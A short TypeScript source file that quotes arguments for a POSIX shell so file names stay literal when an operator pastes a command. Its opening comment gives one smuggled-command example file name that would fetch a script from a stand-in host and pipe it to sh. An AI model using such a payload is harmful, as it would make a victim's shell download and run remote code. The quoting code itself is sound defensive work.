// POSIX shell quoting for commands the operator may paste into a terminal.
// An argument can carry a file name, and a file name is chosen by whoever
// put the file there: `x$(curl evil|sh).mkv` must stay a name.

const SAFE = /^[A-Za-z0-9_@%+=:,./-]+$/;

/** One argument as a POSIX shell reads it back unchanged: bare when it is plainly safe, else single-quoted. */
export function shellQuote(arg: string): string {
  if (SAFE.test(arg)) return arg;
  return `'${arg.replaceAll("'", `'\\''`)}'`;
}

/** A whole command line, every argument quoted. */
export function shellCommand(args: readonly string[]): string {
  return args.map(shellQuote).join(" ");
}
